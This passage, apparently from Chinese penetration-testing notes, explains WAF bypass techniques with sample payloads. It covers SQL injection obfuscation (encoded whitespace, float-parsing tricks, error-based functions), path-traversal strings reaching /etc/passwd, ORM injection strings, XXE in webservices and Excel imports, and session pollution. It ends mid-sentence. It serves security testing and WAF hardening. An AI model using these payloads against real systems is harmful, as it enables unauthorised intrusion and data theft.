SQL\u6ce8\u5165\u89c4\u5219\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u201c\\s\u201d\u5339\u914d\u7a7a\u683c\uff0c\u4f8b\u5982\u201dselect\\s+union\u201d\u3002\u5229\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u7a7a\u767d\u7b26\u4e0eMySQL\u7a7a\u767d\u7b26\u7684\u4e0d\u540c\u53ef\u7ed5\u8fc7WAF\u89c4\u5219\u3002\u5982\u4f55\u8fd9\u4e9bMySQL\u7684\u7279\u6027\uff1f\u901a\u8fc7fuzz,\u6bcf\u6b21\u66f4\u6539\u6b63\u5e38SQL\u8bed\u53e5\u7684\u67d0\u90e8\u5206\uff0c\u66ff\u6362\u4e3a\u5176\u4ed6\u5b57\u7b26\uff0c\u5224\u65ad\u8bed\u6cd5\u662f\u5426\u6b63\u786e\uff0c\u5373\u53ef\u5224\u65ad\u51fa\u6765MySQL\u8bed\u6cd5\u7279\u6027\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5206\u6790MySQL\u8bcd\u6cd5\u6765\u53d1\u73b0\u8bed\u6cd5\u7279\u6027\uff0c\u4ece\u800c\u627e\u5230\u7ed5\u8fc7\u65b9\u6cd5\u3002 \u5229\u7528\u7a7a\u767d\u7b26\u8fdb\u884c\u7ed5\u8fc7\uff0c\u6d4b\u8bd5WAF\u65f6\u5c3d\u53ef\u80fd\u51cf\u5c11\u5176\u4ed6\u539f\u56e0\u7684\u5f71\u54cd\uff0c\u4f8b\u5982\u201dunion select\u201d\u88ab\u62e6\u622a\uff0c\u53ea\u9700\u628a\u4e2d\u95f4\u7a7a\u767d\u7b26\u66ff\u6362\u4e3a\u201d%250C\u201d, \u201c%25A0\u201d\u8fdb\u884c\u7ed5\u8fc7\u6d4b\u8bd5\u3002 union%250Cselect union%25A0select \u51fd\u6570\u5206\u9694\u7b26 \u5bf9\u57fa\u4e8e\u6b63\u5219\u8868\u8fbe\u5f0f\u7684WAF\uff0c\u6211\u4eec\u731c\u6d4b\u5b89\u5168\u5de5\u7a0b\u5e08\u5199WAF\u89c4\u5219\u65f6\uff0c\u53ef\u80fd\u4e0d\u77e5\u9053\u51fd\u6570\u540d\u4e0e\u5de6\u62ec\u53f7\u4e4b\u95f4\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\uff0c\u6216\u8005\u9057\u6f0f\u53ef\u4ee5\u5b58\u5728\u7279\u6b8a\u5b57\u7b26\u3002\u4f8b\u5982\u5339\u914d\u51fd\u6570\u201dconcat()\u201d\u7684\u89c4\u5219\u5199\u6cd5\uff0c\u201cconcat(\u201d\u6216\u8005\u201dconcat\\s*(\u201d\uff0c\u5c31\u6ca1\u6709\u8003\u8651\u5230\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u3002\u76f8\u5e94\u7684\u7ed5\u8fc7\u65b9\u6cd5\uff0c\u5728\u7279\u6b8a\u4f4d\u7f6e\u5f15\u5165\u7279\u6b8a\u7684\u5206\u9694\u7b26\uff0c\u9010\u4e2a\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u7279\u6b8a\u5206\u9694\u7b26\u53d1\u73b0\u4e5f\u662f\u901a\u8fc7Fuzz\u51fa\u6765\u7684\u3002 concat%2520( concat/**/( concat%250c( concat%25a0( \u4e3e\u4e00\u53cd\u4e09\uff0c\u5bfb\u627e\u7c7b\u4f3c\u7684\u5173\u952e\u4f4d\u7f6e\uff0cFuzz\u7279\u6b8a\u5b57\u7b26\uff0c\u53d1\u73b0\u66f4\u591a\u7684\u7ed5\u8fc7\u65b0\u65b9\u6cd5\u3002\u731c\u6d4b\u5de5\u7a0b\u5e08\u4eec\u5199\u89c4\u5219\u56e0\u4e3a\u5404\u79cd\u539f\u56e0\u5bb9\u6613\u9057\u6f0f\u7684\u70b9\uff0c\u8fdb\u884c\u7ed5\u8fc7WAF\u68c0\u6d4b\u3002 \u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790 \u5229\u7528MySQL\u89e3\u6790\u6d6e\u70b9\u6570\u7684\u7279\u70b9\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u65e0\u6cd5\u5339\u914d\u51fa\u5355\u8bcdunion\uff0c\u4f46\u662fMySQL\u8bcd\u6cd5\u89e3\u6790\u6210\u529f\u89e3\u6790\u51fa\u6d6e\u70b9\u6570\u3001sql\u5173\u952e\u5b57union\u3002 select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\\Nunion select 1,2,3,4,5,6,7,8,9,0 \u5229\u7528error-based\u8fdb\u884cSQL\u6ce8\u5165 Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u975e\u5e38\u5bb9\u6613\u88ab\u5ffd\u7565\uff0c\u5bfc\u81f4WAF\u89c4\u5219\u8fc7\u6ee4\u4e0d\u5b8c\u6574\u3002\u968f\u7740\u5bf9MySQL\u7814\u7a76\u8d8a\u6765\u8d8a\u6df1\uff0c\u88ab\u53d1\u73b0\u53ef\u7528\u4e8eerror-based SQL\u6ce8\u5165\u7684\u51fd\u6570\u8d8a\u6765\u8d8a\u591a\uff0c\u540c\u65f6\u4e5f\u7ed9\u7ed5\u8fc7WAF\u9020\u5c31\u4e86\u66f4\u591a\u673a\u4f1a\u3002\u5e38\u89c1\u7684\u51fd\u6570\uff1a extractvalue(1, concat(0x5c,md5(3))); updatexml(1, concat(0x5d,md5(3)),1); GeometryCollection((select*from(select*from(select@@version)f)x)) polygon((select*from(select name_const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() \u5229\u7528Error-based\u7684SQL\u6ce8\u5165\u51fd\u6570\u8fdb\u884c\u7ed5\u8fc7\u65f6\uff0c\u53ef\u4ee5\u7ed3\u5408\u51fd\u6570\u5206\u9694\u7b26\uff0c\u6216\u5176\u4ed6\u65b9\u6cd5\u7075\u6d3b\u8fd0\u7528\u3002 Mysql\u7279\u6b8a\u8bed\u6cd5 \u6700\u6709\u6548\u7684\u53d1\u73b0\u624b\u6bb5\uff0c\u8fd8\u662f\u53bb\u8bfb\u8bfbMySQL\u8bcd\u6cd5\u5206\u6790\u6e90\u4ee3\u7801\u3002\u548c\u534f\u8bae\u7ed5\u8fc7\u7c7b\u4f3c\uff0c\u6316\u6398SQL\u6807\u51c6\u4e0eMySQL\u7684\u8bcd\u6cd5\u5206\u6790\u5dee\u5f02\u662f\u53d1\u73b0WAF SQL\u6ce8\u5165\u7ed5\u8fc7\u7684\u6709\u6548\u624b\u6bb5\u3002\u4ee5\u4e0b\u662fMySQL\u8bed\u6cd5\u7684\u4e00\u4e2a\u7279\u5199(ps:\u4e0d\u662f\u6211\u53d1\u73b0\u7684)\uff1a select{x table_name}from{x information_schema.tables}; \u7efc\u5408\u5229\u7528\u5b9e\u4f8b \u4ee5\u4e0a\u90fd\u662fSQL\u6ce8\u5165\u7ed5\u8fc7\u4e2d\u7684\u6280\u672f\u70b9\uff0c\u5728\u5b9e\u9645\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u9700\u8981\u7075\u6d3b\u7efc\u5408\u5229\u7528\u624d\u80fd\u8fbe\u5230\u5b8c\u6574\u7ed5\u8fc7\uff0c\u8bfb\u53d6\u6570\u636e\u6570\u636e\u3002\u4ee5\u4e0b\u7ed9\u51fa\u5b8c\u6574\u7ed5\u8fc7WAF SQ\u6ce8\u5165\u68c0\u6d4b\u7684\u5b9e\u4f8b\u3002\u5982\u56fe\uff0c\u672c\u4f8b\u4e2d\u7efc\u5408\u591a\u4e2a\u7ed5\u8fc7\u6280\u672f\u70b9\uff0c\u6700\u7ec8\u5b9e\u73b0\u5b8c\u6574\u7ed5\u8fc7\u5b9e\u73b0\u8bfb\u53d6\u6570\u636e\u3002 \u5229\u7528\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7union select \u7684\u68c0\u6d4b\u3002 \u540c\u6837\uff0c\u51fd\u6570\u5206\u9694\u7b26\u601d\u60f3\u96c6\u548c\u6d6e\u70b9\u6570\u8bcd\u6cd5\u89e3\u6790\uff0c\u7ed5\u8fc7\u5173\u952e\u5b57from\u7684\u68c0\u6d4b\u3002 \u6700\u540e\u7a7a\u767d\u5206\u5206\u5272\u7ed5\u8fc7INFORMATION_SCHEMA.TABLES\u7684\u68c0\u67e5 4.2.\u6587\u4ef6\u5305\u542b \u00b6 \u6587\u4ef6\u5305\u542b\u5206\u4e3a\u76f8\u5bf9\u8def\u5f84\u3001\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u3002\u5728\u76f8\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\u4e2d\uff0c\u6700\u7ec8\u6839\u636eLinux\u865a\u62df\u6587\u4ef6\u7cfb\u7edf(vfs)\u7684\u89c4\u5219\u67e5\u627e\u6587\u4ef6\uff0c\u901a\u8fc7\u5206\u6790vfs\u7684\u6587\u4ef6\u8def\u5f84\u89e3\u6790\u89c4\u5219\uff0c\u63d0\u53d6\u5176\u4e2d\u89c4\u5219\u7279\u70b9\uff0c\u7528\u8fd9\u4e9b\u7279\u70b9\u53bb\u7ed5\u8fc7WAF\u3002\u5728\u7edd\u5bf9\u6587\u4ef6\u8def\u5f84\u5305\u542b\u4e2d\uff0c\u4e3b\u8981\u662f\u6839\u636e\u653b\u51fb\u573a\u666f\uff0cWAF\u672a\u8fc7\u6ee4\u4e00\u4e9b\u534f\u8bae\u3001\u672a\u8fc7\u6ee4\u67d0\u4e9b\u7279\u6b8a\u8def\u5f84\u3002 \u76f8\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 \u5199WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u65f6\uff0c\u5982\u679c\u68c0\u6d4b\u5355\u4e00\u7684\u201d../\u201d\uff0c\u8bef\u62a5\u4f1a\u975e\u5e38\u591a\uff0c\u6240\u4ee5WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u901a\u5e38\u4f1a\u68c0\u6d4b\u8fde\u7eed\u7684\u201c../\"\u3002\u6839\u636evfs\u89e3\u6790\u8def\u5f84\u7684\u8bed\u6cd5\uff0c\u89e3\u6790\u5230\u201c//\u201d\u6587\u4ef6\u8def\u5f84\u4e0d\u53d8\uff0c\u89e3\u6790\u5230\u201c/./\u201d\u6587\u4ef6\u8def\u5f84\u4f9d\u7136\u3002 \u901a\u8fc7\u907f\u514d\u8fde\u7eed\u7684\"../\"\uff0c\u4ece\u800c\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u89c4\u5219\u3002Eg: ././..///./.././/../etc//passwd\uff0c\u5b83\u7b49\u4ef7\u4e8e../../../etc/passwd \u7edd\u5bf9\u8def\u5f84\u7684\u7ed5\u8fc7 WAF\u6ca1\u6709\u8003\u8651\u5230\u8def\u5f84\u4e2d\u63d2\u5165\u201c/./\u201d\u3001\u201c//\u201d\u5bf9\u4e8evfs\u89e3\u6790\u8def\u5f84\u662f\u7b49\u4ef7\u7684\uff0c\u5bfc\u81f4\u53ef\u88ab\u7ed5\u8fc7\u3002\u4f8b\u5982 /etc/./passwd \u4e0e /etc/passwd \u662f\u7b49\u4ef7\u7684\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7\u7ec4\u5408\u201c/./\u201d\u3001\u201c//\u201d\u8fdb\u884c\u7ed5\u8fc7\uff0ceg. /etc///.//././/passwd\u3002 \u5bf9\u4e8e\u7edd\u5bf9\u8def\u5f84\u6587\u4ef6\u5305\u542b\uff0cWAF\u4e00\u822c\u4f1a\u62e6\u622a\u5e38\u89c1\u8def\u5f84\uff0c\u800c\u4e0d\u4f1a\u9632\u5fa1\u6240\u6709\u7684\u7edd\u5bf9\u8def\u5f84\u3002\u56e0\u6b64\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u53ef\u4ee5\u5305\u542b\u5176\u4ed6\u7684\u8def\u5f84\u4e0b\u4e00\u4e9b\u6587\u4ef6\uff0c\u4f8b\u5982/usr/local/nginx/conf/nginx.conf\u3002 \u5982\u679cWAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u68c0\u67e5\u5f00\u59cb\u8def\u5f84\u4e3aLinux\u7684\u76ee\u5f55\u540d\uff0c\u53ef\u4ee5\u91c7\u7528/wtt/../\u7ed5\u8fc7WAF\u6587\u4ef6\u5305\u542b\u68c0\u6d4b\u3002 \u4f8b\u5982\uff0c\u201c/wtt/../etc/passwd\u201d\uff0c wtt\u4e0d\u662fLinux\u6807\u51c6\u76ee\u5f55\uff0c\u4e0d\u4f1a\u88ab\u89c4\u5219\u5339\u914d\u3002WAF\u53ea\u68c0\u6d4b\u8fde\u7eed\u7684../\uff0c\u4f46\u662f\u53ea\u4f7f\u7528\u4e00\u4e2a../\uff0c\u4e0d\u88ab\u62e6\u622a\u3002\u6700\u7ec8\u8bfb\u53d6/etc/passwd\u6587\u4ef6\u3002 \u5229\u7528WAF\u672a\u68c0\u6d4b\u7684\u534f\u8bae\u3002PHP \u6587\u4ef6\u5305\u542b\u652f\u6301\u7684\u534f\u8bae\uff0c\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u770b\u73af\u5883\u9009\u62e9\u53ef\u884c\u7684\u65b9\u6cd5 file:// \u2014 Accessing local filesystem http:// \u2014 Accessing HTTP(s) URLs ftp:// \u2014 Accessing FTP(s) URLs php:// \u2014 Accessing various I/O streams zlib:// \u2014 Compression Streams data:// \u2014 Data (RFC 2397) glob:// \u2014 Find pathnames matching pattern phar:// \u2014 PHP Archive ssh2:// \u2014 Secure Shell 2 rar:// \u2014 RAR ogg:// \u2014 Audio streams expect:// \u2014 Process Interaction Streams \u603b\u7ed3 \u4e00\u4e2a\u597dWAF\u4e0d\u662f\u5439\u51fa\u6765\u7684\uff0c\u662f\u5b9e\u8df5\u68c0\u9a8c\u51fa\u6765\u7684\u3002\u7814\u7a76WAF\u7684\u7ed5\u8fc7\u624b\u6bb5\uff0c\u662f\u4e3a\u4e86\u66f4\u597d\u7684\u63d0\u5347WAF\u7684\u9632\u5fa1\u80fd\u529b\u3002\u5728\u7814\u7a76\u7a81\u7834\u7684\u8fc7\u7a0b\u4e2d\uff0c\u4e0d\u8981\u4ec5\u4ec5\u505c\u7559\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u57fa\u672c\u6f0f\u6d1e\u539f\u7406\uff0c\u9700\u8981\u5bf9\u6d89\u53ca\u5e76\u6df1\u5165\u66f4\u591a\u7684\u9886\u57df\uff0c\u4f8b\u5982HTTP\u534f\u8bae\u7406\u89e3\u548cPHP\u3001Tomcat\u5bf9HTTP\u534f\u8bae\u6e90\u7801\u5206\u6790\uff0cMySQL\u8bcd\u6cd5\u5206\u6790\uff0c\u548cFuzz\u7684\u601d\u8def\u7b49\u3002\u5728\u6b64\u8fc7\u7a0b\u4e2d\uff0c\u4f1a\u6709\u8bb8\u591a\u4e50\u8da3\uff0c\u4e5f\u4f1a\u6709\u5404\u65b9\u9762\u80fd\u529b\u7684\u63d0\u5347\u3002 3.\u6846\u67b6\u5c42\u7684\u8bed\u53e5\u5206\u6790 \u00b6 \u57fa\u4e8ejpql\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790 \u00b6 jpql\u4e0eSQL\u7684\u533a\u522b\u5c31\u662fSQL\u662f\u9762\u5411\u5bf9\u8c61\u5173\u7cfb\u6570\u636e\u5e93\uff0c\u4ed6\u64cd\u4f5c\u7684\u662f\u6570\u636e\u8868\u548c\u6570\u636e\u5217\uff0c\u800cjpql\u64cd\u4f5c\u7684\u5bf9\u8c61\u662f\u5b9e\u4f53\u5bf9\u8c61\u548c\u5b9e\u4f53\u5c5e\u6027 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 JPQL \uff09\uff1a SELECT e FROM user e WHERE e.id = SQL('(select 1 from dual where 1=1)\u2019) and SQL('(SELECT 1)=1\u2019) \u5b57\u7b26\u7c7b\u578b\uff08JPQL\uff09\uff1a \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165 \u57fa\u4e8eHibernate\u7c7b\u578b\u7684\u7ed5\u8fc7\u5206\u6790 \u00b6 ORM\u6ce8\u5165 \u6570\u5b57\u7c7b\u578b\uff08 Hibernate ORM \uff09\uff1a test\\'' or 1<length((select version())) \u2013 \u7ffb\u8bd1\u6210\u4e3aHQL\u8bed\u53e5\u5c31\u53d8\u4e3a\uff1a SELECT p FROM pl.btbw.persistent.Post p where p.name='test\\'' or 1<length((select version())) \u2013 ' \u6700\u540e\u8f6c\u53d8\u4e3a\u771f\u6b63\u7684SQL\u8bed\u53e5\uff1a select post0_.id as id1_0_, post0_.name as name2_0_ from post post0_ where post0_.name=\u2018test\\'' or 1<length((select version())) -- ' \u8fd9\u6837\u6211\u4eec\u5c31\u4f1a\u9003\u9038\u51fa\u6765\u4e00\u4e2a\u8bed\u53e5\u6216\u8005\u65b9\u6cd5 \u901a\u5e38\u6307\u7684\u662f\u7c7b\u4f3chibernate\u4e00\u7c7b\u5177\u6709\u5b89\u5168\u8bed\u6cd5\u68c0\u6d4b\u7684\u6ce8\u5165 \u4e8c\u3001\u57fa\u4e8e\u4e09\u65b9\u8c03\u7528\u6846\u67b6\u5206\u6790\u5229\u7528 \u00b6 WEBSERVICE\u63a5\u53e3 \u00b6 1.\u9ed8\u8ba4\u7684\u5b89\u5168\u914d\u7f6e2.\u672a\u6388\u6743\u7684\u8bbf\u95ee3.\u81ea\u8eab\u672a\u4fee\u590d\u6f0f\u6d1eWEBSERVICE Jws\u6587\u4ef6\u5ba1\u8ba1 \u200b \u901a\u5e38\u800c\u8a00jws\u6587\u4ef6\u4e5f\u662faxis2\u53d1\u5e03\u7684\u4e00\u79cd\u8868\u73b0\u5f62\u5f0f\uff0c\u7136\u540e\u66f4\u591a\u7684\u88ab \u5ba1\u8ba1\u4eba\u5458\u5ffd\u7565 \u5728web\u76ee\u5f55\u5168\u5c40\u67e5\u627ejws\u7ed3\u5c3e\u7684\u6587\u4ef6 \u6839\u636e\u5bf9\u5e94\u7684web\u8bbf\u95ee\u76ee\u5f55\u901a\u8fc7\u6d4f\u89c8\u5668\u8fdb\u884c\u8bbf\u95ee \u5bf9\u5176\u76f8\u5e94\u7684\u63a5\u53e3\u8fdb\u884c\u5ba1\u8ba1 SOAPMonitor \u7528\u6765\u8fdb\u884cwebservice\u7ba1\u7406\u53d1\u5e03\uff0c\u8c03\u8bd5\u7b49\u7b49\uff0c\u8fd9\u91cc\u9762\u5b58\u5728\u4e00\u4e2a\u53cd\u5e8f \u5217\u5316\u7684\u95ee\u9898 \u8bbf\u95ee\u6839\u8def\u5f84/SOAPMonitor , \u53f3\u952e\u6e90\u7801\u5c31\u53ef\u4ee5\u770b\u5230\u4e00\u4e2a\u914d\u7f6e\u9879 \u5185\u5bb9 \u8fdc\u7a0b\u8c03\u8bd5\u65f6\u5019\u5f00\u653e\u9ed8\u8ba45001\u7aef\u53e3\u8fdb\u884c\u5bf9\u8c61\u4f20\u8f93 \u5bfb\u627e\u5bf9\u5e94\u7684\u6267\u884c\u94fe\u6784\u9020payload\u8fdb\u884crec Axis2 \u5bf9\u4e8e\u6574\u4e2a\u9879\u76ee\u901a\u8fc7axis2\u6216\u8005axis\u53d1\u5e03\u7684\u670d\u52a1\uff0c\u4ece\u7edf\u8ba1\u7ecf\u9a8c\u4e0a\u6765\u8bb2\uff0c \u672a\u6388\u6743\u5927\u9762\u79ef\u5b58\u5728\uff0c\u800c\u4e14\u4f4e\u7248\u672c\u7684\u4ece\u5168\u5c40\u4e0a\u5c31\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u6f0f\u6d1e \u8bbf\u95ee\u5bf9\u5e94\u7684webservice\u8def\u5f84\uff0c\u6bd4\u5982/services/\u6216\u8005 /servlet/AxisServlet \u5bf9\u6240\u6709\u63a5\u53e3\u5bf9\u5e94\u7684\u7c7b\u8fdb\u884c\u5ba1\u8ba1\uff0c\u901a\u5e38\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f\u4e00\u4e00\u5bf9\u5e94 \u4f4e\u7248\u672c\u6784\u9020xxe payload\u53ef\u4ee5\u8fdb\u884c\u6f0f\u6d1e\u6d4b\u8bd5 Xfire Web\u53d1\u5e03\u5bb9\u5668\uff0c\u5df2\u7ecf\u505c\u6b62\u7ef4\u62a4\uff0c\u622a\u81f3\u5230\u6700\u540e\u4e00\u4e2a\u7248\u672c\uff0c\u5728 webservice\u4e0a\u8fd8\u662f\u5b58\u5728xml\u5b9e\u4f53\u6ce8\u5165 \u8bbf\u95ee\u6839\u8def\u5f84/services\uff0c\u66b4\u9732\u5bf9\u5e94\u7684webservices\u63a5\u53e3 \u6784\u9020payload\u5168\u5c40\u9020\u6210xml\u5b9e\u4f53\u6ce8\u5165 DWR\u63a5\u53e3 \u00b6 \u5b9e\u9645\u7684\u7f51\u7ad9\u53d1\u5e03debug\u6a21\u5f0f\u662f\u5173\u95ed\u72b6\u6001\uff0c\u6211\u4eec\u505a\u9ed1\u76d2\u6d4b\u8bd5\u5c31\u8981\u53bb\u731c\u6d4b \u4e24\u4e2a\u9ed8\u8ba4\u76ee\u5f55,\u5206\u522b\u4e3a/exec/\u548c/dwr \u5ba1\u8ba1\u53ef\u4ee5\u5957\u7528\u5de6\u8fb9\u7684\u8bf7\u6c42\u5305\u7684\u6a21\u677f\uff0c\u5728\u4f60\u8ba4\u4e3a\u5b58\u5728\u95ee\u9898\u7684\u5730\u65b9\u6784\u9020 java\u63a5\u53e3\u8c03\u7528\u7684\u8bf7\u6c42\u6570\u636e\u5305 \u7f51\u7ad9\u53d1\u5e03dwr\u63a5\u53e3\uff0c\u901a\u5e38\u90fd\u662f\u672a\u6388\u6743\u8c03\u7528\uff0c\u5305\u542b\u5185\u5bb9\u6bd4\u8f83\u591a\uff0c\u6bd4\u5982\u7528 \u6237\uff0c\u7ba1\u7406\u7b49api\u63a5\u53e3 \u5982\u679c\u53c2\u6570\u6784\u9020\u6709\u4e0d\u786e\u5b9a\u56e0\u7d20\uff0c\u53ef\u4ee5\u628a\u5bf9\u5e94\u7684dwr\u63a5\u53e3\u7a7a\u5b9e\u73b0\uff0c\u7136\u540e\u8f6c \u63a5\u5230\u6211\u4eec\u81ea\u5df1\u53ef\u4ee5\u672c\u5730\u6a21\u62df\u7684\u4ee3\u7801\u4e0a\u9762\u6765 HESSIAN\u63a5\u53e3 \u00b6 GWT\u63a5\u53e3 \u00b6 \u4e09\u3001\u8da3\u5473\u7684SESSION\u548cEXC \u00b6 SESSION\u6c61\u67d3 \u00b6 \u573a\u666f\uff1a\u5728\u8fdb\u884c\u4e00\u4e9b\u64cd\u4f5c\u65f6,\u5f88\u5e38\u89c1\u7684\u5199\u6cd5\u662f\u5148\u5c06\u9a8c\u8bc1\u7801\u5b58\u50a8\u4e8eSession\u5f53\u4e2d\uff0c\u5c06\u9a8c\u8bc1\u7801\u4f5c\u4e3a\u56fe\u7247\u6216\u662f\u624b\u673a\u9a8c\u8bc1\u7801,\u90ae\u7bb1\u7b49\u65b9\u5f0f\u53d1\u9001\u7ed9\u7528\u6237,\u5bf9\u5176\u8fdb\u884c\u8eab\u4efd\u7684\u9a8c\u8bc1. \u901a\u5e38\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\u4f1a\u5f88\u5bb9\u6613\u5f15\u53d1\u4e00\u4e2a\u95ee\u9898, \u8be5\u573a\u666f\u5e38\u89c1\u4e8ephp\u4e2d:\u7528\u6237A\u627e\u56de\u5bc6\u7801,\u9700\u8981\u8fdb\u884c\u624b\u673a\u6821\u9a8c\u7801\u7684\u6821\u9a8c,\u670d\u52a1\u5668\u628a\u53d1\u9001\u51fa\u53bb\u7684\u9a8c\u8bc1\u7801\u653e\u5728\u4e86Session\u4e2d,\u6b64\u65f6\u7528\u6237\u5fc5\u987b\u8f93\u5165\u6b63\u786e\u7684\u9a8c\u8bc1\u7801\u624d\u80fd\u6210\u529f\u7684\u8fdb\u884c\u5bc6\u7801\u91cd\u7f6e \u573a\u666f: \u5728php\u4e2d,session\u4f7f\u7528\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8,\u5b83\u7684\u552f\u4e00\u6027\u4e0d\u662f\u5f88\u597d(\u591a\u4e2a\u5e94\u7528\u53ef\u4ee5\u8bbf\u95ee\u540c\u4e00\u4e2aSession) \u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51A\u4e0a\u67d0\u7a0b\u5e8f\u5458\u5f00\u53d1\u4e86\u4e00\u5957CMS\uff0c\u628a\u4ed6\u4f5c\u4e3a\u4e00\u4e2ademo\u90e8\u7f72\u5728\u4e86\u81ea\u5df1\u7684\u5b98\u7f51B \uff0c\u4f46\u662f\u8fd9\u4e24\u4e2a\u57df\u540d\u90fd\u89e3\u6790\u5230\u4e86\u540c\u4e00\u670d\u52a1\u5668\u4e0a,\u53ef\u80fd\u5c31\u4f1a\u4ea7\u751f\u5f88\u5927\u7684\u95ee\u9898 \u4f46\u662f\u5982\u679c\u5728\u6ca1\u53d1\u9001\u9a8c\u8bc1\u7801\u7684\u60c5\u51b5\u4e0b\uff0c\u90a3\u4e48session\u4e2dcode\u4e3a\u7a7a,\u518d\u5c06\u8bf7\u6c42\u63d0\u4ea4\u7684\u9a8c\u8bc1\u7801\u7f6e\u4e3a\u7a7a\uff0c\u4f7f\u7528php\u7684\u60c5\u51b5\u4e0b\u4f1a\u5bfc\u81f4false == false\uff0c\u5373\u6761\u4ef6\u4e3a\u771f\uff0c\u9a8c\u8bc1\u7801\u5339\u914d\u6210\u529f\uff0c \u51fa\u73b0\u8fd9\u4e00\u95ee\u9898\u7684\u539f\u56e0\u662f\u7531\u4e8e\u670d\u52a1\u5668\u6ca1\u6709\u6b63\u786e\u7684\u5904\u7406session\uff0c\u5728\u4f7f\u7528\u4e4b\u540e\u5fc5\u987b\u5bf9\u5176\u8fdb\u884c\u9500\u6bc1,\u5e76\u4e14\u9700\u8981\u5bf9session\u8fdb\u884c\u7a7a\u9a8c\u8bc1 \u5728\u672a\u767b\u5f55http://admin.test.com\u7684\u60c5\u51b5\u4e0b,\u901a\u8fc7\u5148\u8bbf\u95eehttp:// www.test.com/ demo\u7ad9\u70b9\u5bf9\u81ea\u5df1\u7684session\u8fdb\u884c\u4e00\u6b21\u8d4b\u503c,\u4f2a\u9020\u51fa\u8eab\u4efd \u90a3\u4e48\u8fd9\u4e2asession\u662f\u53ef\u4ee5\u88abhttp://admin.test.com\u8bbf\u95ee\u5230\u7684,\u6240\u4ee5\u9020\u6210\u7684\u6df7\u6dc6\u4f7f\u7528 \u5f15\u53d1\u5b89\u5168\u95ee\u9898 XXE\u5728EXCEL\u4e2d\u7684\u5e94\u7528\u573a\u666f \u00b6 \u5e94\u7528\u573a\u666f\uff1a \u5728\u5f88\u591a\u7cfb\u7edf\uff0c\u4e0d\u7ba1\u662f\u540e\u53f0\u8fd8\u662f\u524d\u53f0\uff0c\u6211\u4eec\u7ecf\u5e38\u4f1a\u78b0\u5230\uff0c\u5bfc\u5165/\u5bfc \u51fa\u8fd9\u6837\u7684\u5b57\u6837\uff0c\u4ece\u7edf\u8ba1\u7684\u89d2\u5ea6\u6765\u770b\uff0c\u767e\u5206\u4e4b\u516b\u5341\u4ee5\u4e0a\u90fd\u662fexcel\uff0c \u4f8b\u5982\uff0c\u5bfc\u5165\u4eba\u5458\u4fe1\u606f/\u5bfc\u51fa\u4eba\u5458\u4fe1\u606f\uff0c\u5f55\u5165\u7cfb\u7edf\u914d\u7f6e/\u5bfc\u51fa\u7cfb\u7edf\u914d \u7f6e\u7b49\u7b49 \u6280\u5de7\u53d8\u5f62\uff1a \u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\uff0c\u6211\u4eec\u662f\u4e0d\u9700\u8981\u53bb\u4fee\u6539workbook.xml\uff0c\u6709\u65f6\u5019\u6211 \u4eec\u60f3\u8981\u8fbe\u5230\u7684\u76ee\u7684\u5c31\u662f\uff0c\u5bfc\u51fa\u6765\u4e4b\u540e\uff0c\u7136\u540e\u6839\u636e\u683c\u5f0f\uff0c\u5916\u90e8\u5b9e\u4f53 \u5f15\u5165\uff0c\u8bfb\u53d6\u7cfb\u7edf\u6587\u4ef6\uff0c\u6bd4\u5982/etc/passwd\u7b49\uff0c\u53ef\u4ee5\u5728\u5bfc\u5165\u7684\u65f6\u5019 \u8fdb\u884c\u64cd\u4f5c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u5e94\u8be5\u53bb\u4fee\u6539xl/worksheets/sheet1.xml \u8c03\u7528\u7684\u5b9e\u4f53 \u66ff\u6362\u6a21\u677f\u6570\u636e\u5373\u53ef\uff0c\u8fd9\u65f6\u5019\u5f53\u6211\u4eec\u5bfc\u5165\u65f6\u5019\uff0c\u5c31\u4f1a\u628a 